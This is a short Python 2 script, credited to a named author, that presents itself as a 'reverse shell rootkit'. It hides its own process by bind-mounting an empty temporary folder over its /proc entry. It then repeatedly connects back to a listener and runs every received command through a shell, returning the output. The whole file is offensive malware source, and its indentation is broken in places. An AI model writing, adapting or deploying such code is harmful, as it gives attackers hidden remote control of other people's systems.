#!/usr/bin/python

"""
Author : Mohammad Askar | @mohammadaskar2
Description : Reverse shell rootkit
"""
import os
import socket
import subprocess
import string
import time
import random as r

# Strings to generate the temporary random process name from
ch = string.uppercase + string.digits 
token = "".join(r.choice(ch) for i in range(5)) 
pid = os.getpid() 
# make bind mount on the current process folder in /proc to hide it 
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
host = "localhost" 
port = 8888 
# print message (for debugging issues)
print "[+]Rootkit is working now , check your connection  .. " 
def MakeConnection(h, p): 
    try: 
		# Reverse connection interval
		time.sleep(5) 
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((h, p))
		while True:
				command =  sock.recv(1024)
				# Exit if the attacker sent exit command
			        if command.strip("\n") == "exit":
				     # Close socket	
                		     sock.close() 
       			        proc = subprocess.Popen(command, stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True) # Execute the sent command
        			proc_result = proc.stdout.read() + proc.stderr.read() 
        			sock.send(proc_result) 
	except socket.error:
		pass  
while True:
	MakeConnection(host, port) 
